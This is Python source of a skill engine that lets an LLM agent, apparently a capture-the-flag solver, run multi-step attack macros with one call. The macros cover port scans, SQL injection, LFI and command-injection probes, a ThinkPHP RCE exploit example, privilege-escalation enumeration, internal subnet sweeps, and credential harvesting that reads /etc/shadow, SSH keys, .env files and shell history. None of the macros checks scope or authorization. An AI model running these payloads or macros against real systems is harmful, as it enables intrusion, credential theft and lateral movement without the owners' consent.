"""
Skill Engine - Predefined multi-step automation workflows

Design principle: Each skill replaces 5-15 LLM reasoning steps with a single call.
The LLM only needs to say: {"action": "skill", "action_input": {"name": "full_recon", "target": "10.0.0.1"}}
The skill engine automatically executes the full sequence and returns a structured summary.

Token savings estimate:
  - Without skills: 5 LLM calls * ~2000 tokens = ~10,000 tokens per recon
  - With skills: 1 LLM call * ~2000 tokens + 1 summary * ~1500 tokens = ~3,500 tokens
  - Savings: ~65% per skill invocation
"""

import json
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional

from tools.base import ToolResult
from tools.shell import ShellTool
from utils.flag_parser import FlagParser
from utils.logger import get_logger

logger = get_logger("skills.engine")


@dataclass
class SkillStep:
    """A single step within a skill"""
    name: str
    command: str
    timeout: int = 120
    parse_fn: Optional[str] = None  # name of parser to apply
    continue_on_fail: bool = True   # continue even if this step fails
    condition: Optional[str] = None  # skip if condition not met


@dataclass
class SkillResult:
    """Aggregated result from a multi-step skill execution"""
    skill_name: str
    success: bool
    steps_executed: int
    steps_total: int
    summary: str
    details: List[Dict[str, Any]] = field(default_factory=list)
    flags_found: List[str] = field(default_factory=list)
    open_ports: List[Dict[str, Any]] = field(default_factory=list)
    services: List[Dict[str, Any]] = field(default_factory=list)
    vulnerabilities: List[str] = field(default_factory=list)
    credentials: List[Dict[str, str]] = field(default_factory=list)
    interesting_files: List[str] = field(default_factory=list)
    raw_outputs: Dict[str, str] = field(default_factory=dict)

    def to_compact_summary(self) -> str:
        """Generate a compact summary for LLM consumption (saves tokens)"""
        parts = [f"=== Skill [{self.skill_name}] Result ==="]
        parts.append(f"Status: {'SUCCESS' if self.success else 'PARTIAL'} ({self.steps_executed}/{self.steps_total} steps)")

        if self.open_ports:
            port_str = ", ".join(f"{p['port']}/{p.get('proto','tcp')}" for p in self.open_ports)
            parts.append(f"Open Ports: {port_str}")

        if self.services:
            for s in self.services:
                parts.append(f"  {s.get('port','?')}: {s.get('service','unknown')} {s.get('version','')}")

        if self.flags_found:
            parts.append(f"FLAGS FOUND: {', '.join(self.flags_found)}")

        if self.vulnerabilities:
            parts.append("Vulnerabilities:")
            for v in self.vulnerabilities[:10]:
                parts.append(f"  - {v}")

        if self.credentials:
            parts.append("Credentials:")
            for c in self.credentials:
                parts.append(f"  - {c.get('user','?')}:{c.get('pass','?')} @ {c.get('service','?')}")

        if self.interesting_files:
            parts.append("Interesting Files:")
            for f in self.interesting_files[:10]:
                parts.append(f"  - {f}")

        if self.summary:
            parts.append(f"\nSummary: {self.summary}")

        return "\n".join(parts)


class SkillEngine:
    """
    Executes predefined skill workflows.
    Acts as a 'macro' system for the agent - one LLM call triggers many tool operations.
    """

    def __init__(self, config: dict = None):
        self.config = config or {}
        self.shell = ShellTool(config=self.config.get("shell", {}))
        self._skills: Dict[str, Callable] = {}
        self._register_builtin_skills()

    def _register_builtin_skills(self):
        """Register all built-in skills"""
        self._skills["full_recon"] = self._skill_full_recon
        self._skills["web_recon"] = self._skill_web_recon
        self._skills["flag_hunt"] = self._skill_flag_hunt
        self._skills["privesc_check"] = self._skill_privesc_check
        self._skills["credential_harvest"] = self._skill_credential_harvest
        self._skills["lateral_recon"] = self._skill_lateral_recon
        self._skills["web_vuln_quick"] = self._skill_web_vuln_quick
        self._skills["smb_enum"] = self._skill_smb_enum
        self._skills["db_enum"] = self._skill_db_enum
        self._skills["deep_port_scan"] = self._skill_deep_port_scan
        self._skills["java_memshell_inject"] = self._skill_java_memshell_inject

    def list_skills(self) -> Dict[str, str]:
        """Return skill name -> description mapping"""
        return {
            "full_recon": "Full recon: nmap top ports + service detection + web probe + robots.txt + common dirs. Requires: target",
            "web_recon": "Web recon: homepage + headers + robots.txt + sitemap + common paths + .git + backup files. Requires: url",
            "flag_hunt": "Search entire filesystem for flags: find + grep across common locations. No params required (runs on current host)",
            "privesc_check": "Linux privilege escalation enum: SUID, sudo, cron, capabilities, writable dirs, kernel version. No params",
            "credential_harvest": "Harvest credentials from config files, env vars, history, SSH keys, DB configs. No params",
            "lateral_recon": "Internal network discovery: ping sweep, ARP, routes, connections, internal port scanning. Requires: subnet (e.g. 10.0.0)",
            "web_vuln_quick": "Quick web vuln checks: SQLi test params, LFI probes, common admin paths, backup files. Requires: url",
            "smb_enum": "SMB/CIFS enumeration: shares, users, null sessions, known vulns. Requires: target",
            "db_enum": "Database enumeration: MySQL/PG/Redis/MongoDB unauth checks, default creds. Requires: target",
            "deep_port_scan": "Deep scan: full TCP ports + top UDP ports + vuln scripts. Requires: target",
            "java_memshell_inject": "Guidance for injecting Java Memory Shell on No-Echo vulnerabilities (Shiro/Fastjson). Requires: target, vuln_type(optional)",
        }

    def execute(self, skill_name: str, **kwargs) -> SkillResult:
        """Execute a skill by name"""
        if skill_name not in self._skills:
            # Check for dynamic skills
            if skill_name in self._dynamic_descriptions:
                return self._run_dynamic_skill(skill_name, **kwargs)
            return SkillResult(
                skill_name=skill_name, success=False, steps_executed=0, steps_total=0,
                summary=f"Unknown skill: {skill_name}. Available: {list(self._skills.keys())}"
            )

        logger.info(f"Executing skill: [{skill_name}] with params: {kwargs}")
        try:
            result = self._skills[skill_name](**kwargs)
            logger.info(f"Skill [{skill_name}] complete: {result.steps_executed}/{result.steps_total} steps, "
                        f"{len(result.flags_found)} flags found")
            return result
        except Exception as e:
            logger.error(f"Skill [{skill_name}] error: {str(e)}")
            return SkillResult(
                skill_name=skill_name, success=False, steps_executed=0, steps_total=0,
                summary=f"Skill execution error: {str(e)}"
            )

    # ==================== Dynamic Skill System ====================

    _dynamic_skills: Dict[str, list] = {}       # name -> list of command templates
    _dynamic_descriptions: Dict[str, str] = {}  # name -> description

    def register_dynamic_skill(self, name: str, description: str, commands: list) -> str:
        """
        Register a new skill at runtime from a list of command templates.

        Args:
            name: Unique skill name (e.g. 'thinkphp_rce')
            description: What this skill does
            commands: List of dicts with {cmd, timeout, desc} - commands can use {target}/{url}/{port} placeholders

        Example:
            engine.register_dynamic_skill(
                name="thinkphp_rce",
                description="ThinkPHP 5.x RCE exploit chain",
                commands=[
                    {"cmd": "curl -s '{url}/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id'", "desc": "test RCE"},
                    {"cmd": "curl -s '{url}/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag*'", "desc": "grab flag"},
                ]
            )
        """
        self._dynamic_skills[name] = commands
        self._dynamic_descriptions[name] = description
        self._skills[name] = lambda **kw: self._run_dynamic_skill(name, **kw)
        logger.info(f"Dynamic skill registered: [{name}] ({len(commands)} steps)")
        return f"Skill [{name}] registered with {len(commands)} steps"

    def _run_dynamic_skill(self, name: str, **kwargs) -> SkillResult:
        """Execute a dynamically registered skill"""
        commands = self._dynamic_skills.get(name, [])
        if not commands:
            return SkillResult(skill_name=name, success=False, steps_executed=0,
                               steps_total=0, summary=f"No commands for skill [{name}]")

        result = SkillResult(skill_name=name, success=True, steps_executed=0,
                             steps_total=len(commands), summary="")
        all_flags = []

        for step in commands:
            cmd_template = step.get("cmd", "")
            timeout = step.get("timeout", 60)
            desc = step.get("desc", "step")

            # Substitute placeholders
            cmd = cmd_template.format(**kwargs) if kwargs else cmd_template
            r = self._run_cmd(cmd, timeout=timeout)
            result.steps_executed += 1

            flags = self._extract_flags_from_output(r.output)
            all_flags.extend(flags)

            if r.success and r.output.strip():
                result.raw_outputs[desc] = r.output[:2000]
            if flags:
                result.details.append({"step": desc, "flags": flags})

        result.flags_found = list(set(all_flags))
        result.summary = f"Dynamic skill [{name}] | {result.steps_executed}/{result.steps_total} steps | Flags: {len(result.flags_found)}"
        return result

    # ==================== Helpers ====================

    def _run_cmd(self, command: str, timeout: int = 120) -> ToolResult:
        """Run a shell command and return result"""
        return self.shell.execute(command=command, timeout=timeout)

    def _extract_flags_from_output(self, output: str) -> List[str]:
        """Check output for flags"""
        return FlagParser.extract_flags(output)

    # ==================== Built-in Skills ====================

    def _skill_full_recon(self, target: str, **kwargs) -> SkillResult:
        """Full reconnaissance: port scan + service ID + web probe"""
        steps_total = 6
        steps_done = 0
        details = []
        result = SkillResult(skill_name="full_recon", success=True, steps_executed=0,
                             steps_total=steps_total, summary="")
        all_flags = []

        # Step 1: Quick nmap - top 1000 ports with service detection
        r = self._run_cmd(f"nmap -sV -sC -T4 --open -oN /tmp/recon_{target.replace('.','_')}.txt {target}", timeout=300)
        steps_done += 1
        details.append({"step": "nmap_quick", "success": r.success, "output_preview": r.output[:2000]})
        result.raw_outputs["nmap_quick"] = r.output

        # Parse nmap output for ports and services
        if r.success:
            for line in r.output.split("\n"):
                line = line.strip()
                if "/tcp" in line and "open" in line:
                    parts = line.split()
                    port_proto = parts[0].split("/")
                    port = int(port_proto[0])
                    proto = port_proto[1] if len(port_proto) > 1 else "tcp"
                    service = parts[2] if len(parts) > 2 else "unknown"
                    version = " ".join(parts[3:]) if len(parts) > 3 else ""
                    result.open_ports.append({"port": port, "proto": proto})
                    result.services.append({"port": port, "service": service, "version": version})

        all_flags.extend(self._extract_flags_from_output(r.output))

        # Step 2: Detect web ports and probe them
        web_ports = [p["port"] for p in result.open_ports if p["port"] in [80, 443, 8080, 8443, 8888, 3000, 5000, 8000, 9090]]
        if not web_ports and result.open_ports:
            # Try common HTTP-like services
            for s in result.services:
                if any(kw in s.get("service", "").lower() for kw in ["http", "web", "tomcat", "nginx", "apache"]):
                    web_ports.append(s["port"])

        for wp in web_ports[:2]:  # Probe first 2 web ports
            scheme = "https" if wp in [443, 8443] else "http"
            url = f"{scheme}://{target}:{wp}"

            # Step 2a: Get homepage + headers
            r = self._run_cmd(f"curl -s -i -L --max-time 10 '{url}/' 2>/dev/null | head -200", timeout=15)
            steps_done += 1
            details.append({"step": f"web_probe_{wp}", "success": r.success, "output_preview": r.output[:1000]})
            all_flags.extend(self._extract_flags_from_output(r.output))

            # Check for interesting headers
            if r.success:
                for line in r.output.split("\n"):
                    ll = line.lower()
                    if any(kw in ll for kw in ["x-powered-by", "server:", "x-debug", "x-forwarded"]):
                        result.vulnerabilities.append(f"Header: {line.strip()}")

            # Step 2b: robots.txt
            r = self._run_cmd(f"curl -s --max-time 5 '{url}/robots.txt' 2>/dev/null", timeout=10)
            if r.success and "user-agent" in r.output.lower():
                details.append({"step": f"robots_{wp}", "content": r.output[:500]})
                result.interesting_files.append(f"{url}/robots.txt")
                all_flags.extend(self._extract_flags_from_output(r.output))

        steps_done += 1

        # Step 3: Check common sensitive paths
        if web_ports:
            wp = web_ports[0]
            scheme = "https" if wp in [443, 8443] else "http"
            url = f"{scheme}://{target}:{wp}"
            paths_cmd = (
                f"for path in /.git/HEAD /.env /backup /admin /phpinfo.php "
                f"/wp-login.php /.svn/entries /server-status /api /swagger.json "
                f"/actuator /console /.DS_Store /web.config; do "
                f"  code=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 3 '{url}$path' 2>/dev/null); "
                f"  if [ \"$code\" != '404' ] && [ \"$code\" != '000' ]; then "
                f"    echo \"$code $path\"; fi; done"
            )
            r = self._run_cmd(paths_cmd, timeout=60)
            steps_done += 1
            if r.success and r.output.strip():
                for line in r.output.strip().split("\n"):
                    line = line.strip()
                    if line:
                        result.interesting_files.append(f"{url}{line.split(' ', 1)[-1] if ' ' in line else line}")
                details.append({"step": "common_paths", "found": r.output.strip()})
            all_flags.extend(self._extract_flags_from_output(r.output))
        else:
            steps_done += 1

        # Step 4: Check for SSH, FTP, database services
        special_services = []
        for s in result.services:
            svc = s.get("service", "").lower()
            if any(kw in svc for kw in ["ssh", "ftp", "mysql", "postgres", "redis", "mongo", "smb"]):
                special_services.append(s)

        if special_services:
            svc_summary = "; ".join(f"{s['port']}/{s['service']}" for s in special_services)
            result.vulnerabilities.append(f"Notable services found: {svc_summary}")

        steps_done += 1

        # Step 5: OS detection hint
        r = self._run_cmd(f"nmap -O --osscan-guess -T4 {target} 2>/dev/null | grep -E 'OS details|Running|Aggressive' | head -5", timeout=60)
        steps_done += 1
        if r.success and r.output.strip():
            details.append({"step": "os_detect", "result": r.output.strip()})

        # Build summary
        result.flags_found = list(set(all_flags))
        result.steps_executed = steps_done
        result.details = details

        port_summary = ", ".join(f"{p['port']}" for p in result.open_ports) if result.open_ports else "none found"
        service_summary = "; ".join(f"{s['port']}={s['service']} {s.get('version','')}" for s in result.services[:10])
        web_summary = f"Web ports: {web_ports}" if web_ports else "No web services detected"

        result.summary = (
            f"Target: {target} | Ports: [{port_summary}] | {web_summary} | "
            f"Services: {service_summary} | "
            f"Interesting files: {len(result.interesting_files)} | "
            f"Flags: {len(result.flags_found)}"
        )

        return result

    def _skill_web_recon(self, url: str, **kwargs) -> SkillResult:
        """Deep web reconnaissance on a specific URL"""
        result = SkillResult(skill_name="web_recon", success=True, steps_executed=0,
                             steps_total=7, summary="")
        all_flags = []

        # 1. Homepage + response headers analysis
        r = self._run_cmd(f"curl -s -i -L --max-time 10 '{url}/' 2>/dev/null", timeout=15)
        result.steps_executed += 1
        result.raw_outputs["homepage"] = r.output[:3000]
        all_flags.extend(self._extract_flags_from_output(r.output))

        # Analyze headers
        if r.success:
            for line in r.output.split("\n"):
                ll = line.lower().strip()
                if ll.startswith(("server:", "x-powered-by:", "x-aspnet", "x-debug")):
                    result.vulnerabilities.append(f"Header leak: {line.strip()}")
                if "set-cookie" in ll and "httponly" not in ll:
                    result.vulnerabilities.append("Cookie without HttpOnly flag")
                if "set-cookie" in ll and "secure" not in ll:
                    result.vulnerabilities.append("Cookie without Secure flag")

        # 2. robots.txt
        r = self._run_cmd(f"curl -s --max-time 5 '{url}/robots.txt' 2>/dev/null", timeout=10)
        result.steps_executed += 1
        if r.success and len(r.output) > 10 and "404" not in r.output[:50]:
            result.interesting_files.append("robots.txt")
            result.raw_outputs["robots"] = r.output[:1000]
            all_flags.extend(self._extract_flags_from_output(r.output))

        # 3. sitemap.xml
        r = self._run_cmd(f"curl -s --max-time 5 '{url}/sitemap.xml' 2>/dev/null | head -50", timeout=10)
        result.steps_executed += 1
        if r.success and "<?xml" in r.output:
            result.interesting_files.append("sitemap.xml")

        # 4. Check source code leaks
        leak_checks = [
            ("/.git/HEAD", "git"),
            ("/.svn/entries", "svn"),
            ("/.env", "env"),
            ("/wp-config.php.bak", "wp_backup"),
            ("/config.php.bak", "config_backup"),
            ("/web.config", "web_config"),
            ("/.DS_Store", "ds_store"),
            ("/crossdomain.xml", "crossdomain"),
        ]
        found_leaks = []
        for path, name in leak_checks:
            r = self._run_cmd(f"curl -s -o /dev/null -w '%{{http_code}}' --max-time 3 '{url}{path}' 2>/dev/null", timeout=8)
            if r.success and r.output.strip() in ["200", "301", "302", "403"]:
                found_leaks.append(f"{path} ({r.output.strip()})")
                result.interesting_files.append(f"{url}{path}")
        result.steps_executed += 1
        if found_leaks:
            result.vulnerabilities.append(f"Sensitive files accessible: {', '.join(found_leaks)}")

        # 5. Technology fingerprint
        r = self._run_cmd(
            f"curl -s --max-time 10 '{url}/' 2>/dev/null | "
            f"grep -oiE '(wordpress|joomla|drupal|laravel|django|flask|spring|thinkphp|struts|tomcat|"
            f"vue\\.js|react|angular|jquery|bootstrap|php|asp\\.net|node\\.js)' | sort -u",
            timeout=15
        )
        result.steps_executed += 1
        if r.success and r.output.strip():
            techs = r.output.strip().split("\n")
            result.vulnerabilities.append(f"Tech stack: {', '.join(set(techs))}")
            result.raw_outputs["tech_stack"] = ", ".join(set(techs))

        # 6. Common admin/login paths
        admin_paths = [
            "/admin", "/login", "/admin/login", "/manage", "/manager", "/dashboard",
            "/wp-admin", "/administrator", "/user/login", "/api/login",
            "/phpmyadmin", "/adminer", "/console", "/debug",
        ]
        admin_cmd = (
            f"for path in {' '.join(admin_paths)}; do "
            f"  code=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 3 '{url}$path' 2>/dev/null); "
            f"  if [ \"$code\" = '200' ] || [ \"$code\" = '302' ] || [ \"$code\" = '301' ]; then "
            f"    echo \"$code $path\"; fi; done"
        )
        r = self._run_cmd(admin_cmd, timeout=60)
        result.steps_executed += 1
        if r.success and r.output.strip():
            for line in r.output.strip().split("\n"):
                result.interesting_files.append(f"{url}{line.split(' ', 1)[-1]}")
            result.raw_outputs["admin_paths"] = r.output.strip()
        all_flags.extend(self._extract_flags_from_output(r.output))

        # 7. JavaScript file enumeration for API endpoints
        r = self._run_cmd(
            f"curl -s --max-time 10 '{url}/' 2>/dev/null | "
            f"grep -oE 'src=\"[^\"]+\\.js\"' | head -10",
            timeout=15
        )
        result.steps_executed += 1
        if r.success and r.output.strip():
            result.raw_outputs["js_files"] = r.output.strip()

        result.flags_found = list(set(all_flags))
        result.summary = (
            f"URL: {url} | Interesting files: {len(result.interesting_files)} | "
            f"Vulns: {len(result.vulnerabilities)} | Flags: {len(result.flags_found)}"
        )
        return result

    def _skill_flag_hunt(self, **kwargs) -> SkillResult:
        """Comprehensive flag search across filesystem"""
        result = SkillResult(skill_name="flag_hunt", success=True, steps_executed=0,
                             steps_total=6, summary="")
        all_flags = []

        commands = [
            ("find_flag_files", "find / -name '*flag*' -type f 2>/dev/null | head -30", 30),
            ("grep_flag_pattern", "grep -r 'flag{' /root/ /home/ /var/www/ /opt/ /tmp/ /srv/ /etc/ 2>/dev/null | head -30", 30),
            ("cat_common_locations", "cat /root/flag* /home/*/flag* /var/www/*/flag* /opt/flag* /tmp/flag* /flag* 2>/dev/null", 10),
            ("check_env_vars", "env 2>/dev/null | grep -i flag; cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -i flag | head -10", 10),
            ("check_history", "cat /root/.bash_history /home/*/.bash_history 2>/dev/null | grep -i flag | head -10", 10),
            ("deep_grep", "find / -maxdepth 4 -name '*.txt' -o -name '*.conf' -o -name '*.php' -o -name '*.py' -o -name '*.html' 2>/dev/null | "
             "xargs grep -l 'flag{' 2>/dev/null | head -20", 60),
        ]

        for name, cmd, timeout in commands:
            r = self._run_cmd(cmd, timeout=timeout)
            result.steps_executed += 1
            found = self._extract_flags_from_output(r.output)
            all_flags.extend(found)
            if r.success and r.output.strip():
                result.raw_outputs[name] = r.output[:2000]
                if found:
                    result.details.append({"step": name, "flags": found})

        result.flags_found = list(set(all_flags))
        result.summary = f"Searched 6 methods | Flags found: {len(result.flags_found)}"
        if result.flags_found:
            result.summary += f" -> {', '.join(result.flags_found)}"
        return result

    def _skill_privesc_check(self, **kwargs) -> SkillResult:
        """Linux privilege escalation enumeration"""
        result = SkillResult(skill_name="privesc_check", success=True, steps_executed=0,
                             steps_total=8, summary="")
        all_flags = []

        checks = [
            ("whoami", "id && whoami && hostname", 5),
            ("sudo", "sudo -l 2>/dev/null", 10),
            ("suid", "find / -perm -4000 -type f 2>/dev/null", 30),
            ("capabilities", "getcap -r / 2>/dev/null", 30),
            ("crontab", "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null; crontab -l 2>/dev/null", 10),
            ("writable", "find / -writable -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | grep -vE '/tmp/|/dev/' | head -30", 30),
            ("kernel", "uname -a; cat /etc/os-release 2>/dev/null | head -5", 5),
            ("passwd_shadow", "ls -la /etc/passwd /etc/shadow 2>/dev/null; cat /etc/passwd 2>/dev/null | grep -v nologin | grep -v false | grep -v '/bin/sync'", 5),
        ]

        for name, cmd, timeout in checks:
            r = self._run_cmd(cmd, timeout=timeout)
            result.steps_executed += 1
            all_flags.extend(self._extract_flags_from_output(r.output))
            if r.success and r.output.strip():
                result.raw_outputs[name] = r.output[:2000]

                # Parse interesting findings
                if name == "sudo":
                    if "NOPASSWD" in r.output:
                        result.vulnerabilities.append(f"sudo NOPASSWD: {r.output.strip()[:200]}")
                    if "(ALL)" in r.output:
                        result.vulnerabilities.append("sudo ALL permissions detected")

                if name == "suid":
                    dangerous_suids = ["python", "perl", "ruby", "bash", "sh", "nmap", "vim", "find",
                                       "awk", "cp", "mv", "less", "more", "nano", "env", "node"]
                    for line in r.output.split("\n"):
                        for ds in dangerous_suids:
                            if ds in line.lower():
                                result.vulnerabilities.append(f"Exploitable SUID: {line.strip()}")

                if name == "capabilities":
                    if "cap_setuid" in r.output.lower() or "cap_dac" in r.output.lower():
                        result.vulnerabilities.append(f"Dangerous capabilities: {r.output.strip()[:200]}")

                if name == "crontab":
                    if r.output.strip() and "no crontab" not in r.output.lower():
                        result.vulnerabilities.append(f"Cron jobs found (check for writable scripts)")

        result.flags_found = list(set(all_flags))
        result.summary = (
            f"PrivEsc check: {len(result.vulnerabilities)} potential vectors found | "
            f"Flags: {len(result.flags_found)}"
        )
        return result

    def _skill_credential_harvest(self, **kwargs) -> SkillResult:
        """Harvest credentials from common locations"""
        result = SkillResult(skill_name="credential_harvest", success=True, steps_executed=0,
                             steps_total=7, summary="")
        all_flags = []

        searches = [
            ("config_files",
             "find / -maxdepth 4 \\( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '.env' "
             "-o -name 'wp-config.php' -o -name 'config.php' -o -name 'settings.py' -o -name 'database.yml' "
             "-o -name 'application.properties' -o -name 'appsettings.json' \\) 2>/dev/null | head -20", 30),

            ("grep_passwords",
             "grep -rni 'password\\|passwd\\|pwd\\|secret\\|api_key\\|token\\|credential' "
             "/var/www/ /opt/ /etc/ /home/ /root/ 2>/dev/null | "
             "grep -v Binary | grep -v '.pyc' | head -30", 30),

            ("ssh_keys",
             "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name '*.pem' "
             "-o -name 'authorized_keys' 2>/dev/null | head -10", 15),

            ("env_files",
             "find / -maxdepth 4 -name '.env' -type f 2>/dev/null | "
             "while read f; do echo '=== '$f' ==='; cat \"$f\" 2>/dev/null; done | head -100", 15),

            ("bash_history",
             "cat /root/.bash_history /home/*/.bash_history 2>/dev/null | "
             "grep -iE 'pass|pwd|mysql|ssh|su |login|curl.*-u|wget.*--password' | head -20", 10),

            ("db_configs",
             "cat /var/www/*/wp-config.php /var/www/*/config.php /var/www/*/.env "
             "/opt/*/config/*.yml /opt/*/.env 2>/dev/null | "
             "grep -iE 'DB_|DATABASE|PASSWORD|USER|HOST|PORT|SECRET' | head -30", 10),

            ("shadow_file", "cat /etc/shadow 2>/dev/null", 5),
        ]

        for name, cmd, timeout in searches:
            r = self._run_cmd(cmd, timeout=timeout)
            result.steps_executed += 1
            all_flags.extend(self._extract_flags_from_output(r.output))
            if r.success and r.output.strip():
                result.raw_outputs[name] = r.output[:2000]

                # Try to extract credential pairs
                for line in r.output.split("\n"):
                    ll = line.lower()
                    if "password" in ll or "passwd" in ll or "pwd" in ll:
                        result.details.append({"source": name, "line": line.strip()[:200]})

        result.flags_found = list(set(all_flags))
        result.summary = (
            f"Credential search: {len(result.details)} potential credentials found | "
            f"Flags: {len(result.flags_found)}"
        )
        return result

    def _skill_lateral_recon(self, subnet: str = "10.0.0", **kwargs) -> SkillResult:
        """Internal network reconnaissance for multi-layer challenges"""
        result = SkillResult(skill_name="lateral_recon", success=True, steps_executed=0,
                             steps_total=5, summary="")
        all_flags = []

        # 1. Network interfaces & routes
        r = self._run_cmd("ip addr show 2>/dev/null; echo '---ROUTES---'; ip route show 2>/dev/null", timeout=10)
        result.steps_executed += 1
        result.raw_outputs["interfaces"] = r.output[:2000]

        # 2. ARP cache
        r = self._run_cmd("arp -a 2>/dev/null || ip neigh show 2>/dev/null", timeout=10)
        result.steps_executed += 1
        if r.success:
            result.raw_outputs["arp"] = r.output[:1000]

        # 3. Active connections
        r = self._run_cmd("ss -tunap 2>/dev/null || netstat -tunap 2>/dev/null", timeout=10)
        result.steps_executed += 1
        if r.success:
            result.raw_outputs["connections"] = r.output[:2000]

        # 4. Ping sweep
        r = self._run_cmd(
            f"for i in $(seq 1 254); do "
            f"(ping -c 1 -W 1 {subnet}.$i 2>/dev/null | grep '64 bytes' | cut -d' ' -f4 | tr -d ':' &); "
            f"done; wait",
            timeout=120
        )
        result.steps_executed += 1
        alive_hosts = []
        if r.success and r.output.strip():
            alive_hosts = [h.strip() for h in r.output.strip().split("\n") if h.strip()]
            result.raw_outputs["alive_hosts"] = "\n".join(alive_hosts)

        # 5. Quick port scan on discovered hosts
        if alive_hosts:
            for host in alive_hosts[:5]:
                r = self._run_cmd(f"nmap -sV -T4 --top-ports 100 --open {host} 2>/dev/null | grep -E 'open|Nmap scan'", timeout=60)
                all_flags.extend(self._extract_flags_from_output(r.output))
                if r.success and r.output.strip():
                    result.details.append({"host": host, "ports": r.output.strip()[:500]})
        result.steps_executed += 1

        result.flags_found = list(set(all_flags))
        result.summary = (
            f"Subnet {subnet}.0/24 | Alive hosts: {len(alive_hosts)} "
            f"({', '.join(alive_hosts[:5])}) | Flags: {len(result.flags_found)}"
        )
        return result

    def _skill_web_vuln_quick(self, url: str, **kwargs) -> SkillResult:
        """Quick web vulnerability checks"""
        result = SkillResult(skill_name="web_vuln_quick", success=True, steps_executed=0,
                             steps_total=5, summary="")
        all_flags = []

        # 1. SQL injection probe on common params
        sqli_payloads = ["'", "1' OR '1'='1", "1 UNION SELECT 1,2,3--", "'; DROP TABLE--"]
        r = self._run_cmd(
            f"curl -s --max-time 10 '{url}?id=1%27%20OR%201%3D1--' 2>/dev/null | head -100; "
            f"curl -s --max-time 10 '{url}?id=1%27' 2>/dev/null | head -50",
            timeout=20
        )
        result.steps_executed += 1
        if r.success:
            sqli_indicators = ["sql", "syntax", "mysql", "postgresql", "sqlite", "oracle", "error in your", "warning"]
            for indicator in sqli_indicators:
                if indicator in r.output.lower():
                    result.vulnerabilities.append(f"Potential SQLi: '{indicator}' in response for {url}?id=...")
                    break
        all_flags.extend(self._extract_flags_from_output(r.output))

        # 2. LFI/Path traversal
        lfi_payloads = [
            "../../../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index",
        ]
        for payload in lfi_payloads:
            r = self._run_cmd(f"curl -s --max-time 5 '{url}?file={payload}&page={payload}&path={payload}' 2>/dev/null | head -30", timeout=10)
            if r.success and ("root:" in r.output or "PD9waH" in r.output):
                result.vulnerabilities.append(f"LFI confirmed with payload: {payload}")
                all_flags.extend(self._extract_flags_from_output(r.output))
                break
        result.steps_executed += 1

        # 3. Command injection
        r = self._run_cmd(
            f"curl -s --max-time 10 '{url}?cmd=id&exec=id&command=id&ip=;id&host=;id' 2>/dev/null | head -30",
            timeout=15
        )
        result.steps_executed += 1
        if r.success and ("uid=" in r.output or "gid=" in r.output):
            result.vulnerabilities.append("Command injection detected!")
        all_flags.extend(self._extract_flags_from_output(r.output))

        # 4. SSRF check
        r = self._run_cmd(
            f"curl -s --max-time 10 '{url}?url=http://127.0.0.1/&uri=file:///etc/passwd' 2>/dev/null | head -30",
            timeout=15
        )
        result.steps_executed += 1
        if r.success and "root:" in r.output:
            result.vulnerabilities.append("SSRF detected!")
        all_flags.extend(self._extract_flags_from_output(r.output))

        # 5. Backup/source files
        base = url.rstrip("/")
        r = self._run_cmd(
            f"for ext in .bak .old .save .swp .swo ~; do "
            f"  code=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 3 '{base}/index.php$ext' 2>/dev/null); "
            f"  [ \"$code\" = '200' ] && echo \"FOUND: index.php$ext\"; done; "
            f"for f in backup.zip backup.tar.gz www.zip src.zip dump.sql db.sql; do "
            f"  code=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 3 '{base}/$f' 2>/dev/null); "
            f"  [ \"$code\" = '200' ] && echo \"FOUND: $f\"; done",
            timeout=30
        )
        result.steps_executed += 1
        if r.success and "FOUND" in r.output:
            for line in r.output.split("\n"):
                if "FOUND" in line:
                    result.interesting_files.append(line.strip())
                    result.vulnerabilities.append(f"Backup file: {line.strip()}")

        result.flags_found = list(set(all_flags))
        result.summary = (
            f"URL: {url} | Vulnerabilities: {len(result.vulnerabilities)} | "
            f"Flags: {len(result.flags_found)}"
        )
        return result

    def _skill_smb_enum(self, target: str, **kwargs) -> SkillResult:
        """SMB/CIFS enumeration"""
        result = SkillResult(skill_name="smb_enum", success=True, steps_executed=0,
                             steps_total=4, summary="")
        all_flags = []

        checks = [
            ("smbclient", f"smbclient -L //{target}/ -N 2>/dev/null", 15),
            ("enum4linux", f"enum4linux -a {target} 2>/dev/null | head -200", 60),
            ("nmap_smb", f"nmap --script=smb-enum-shares,smb-enum-users,smb-vuln* -p 445 {target} 2>/dev/null | head -100", 120),
            ("rpcclient", f"rpcclient -U '' -N {target} -c 'enumdomusers; enumdomgroups;' 2>/dev/null | head -50", 15),
        ]

        for name, cmd, timeout in checks:
            r = self._run_cmd(cmd, timeout=timeout)
            result.steps_executed += 1
            all_flags.extend(self._extract_flags_from_output(r.output))
            if r.success and r.output.strip():
                result.raw_outputs[name] = r.output[:2000]
                if "MS17-010" in r.output or "VULNERABLE" in r.output:
                    result.vulnerabilities.append("MS17-010 (EternalBlue) vulnerable!")
                if "READ" in r.output.upper() or "WRITE" in r.output.upper():
                    result.vulnerabilities.append(f"SMB shares accessible")

        result.flags_found = list(set(all_flags))
        result.summary = f"SMB enum {target} | Vulns: {len(result.vulnerabilities)} | Flags: {len(result.flags_found)}"
        return result

    def _skill_db_enum(self, target: str, port: int = None, **kwargs) -> SkillResult:
        """Database service enumeration"""
        result = SkillResult(skill_name="db_enum", success=True, steps_executed=0,
                             steps_total=5, summary="")
        all_flags = []

        checks = [
            ("mysql_anon", f"mysql -h {target} -u root --connect-timeout=5 -e 'SHOW DATABASES;' 2>/dev/null", 10),
            ("mysql_empty", f"mysql -h {target} -u root -p'' --connect-timeout=5 -e 'SHOW DATABASES;' 2>&1 | head -20", 10),
            ("redis_noauth", f"redis-cli -h {target} INFO server 2>/dev/null | head -20", 10),
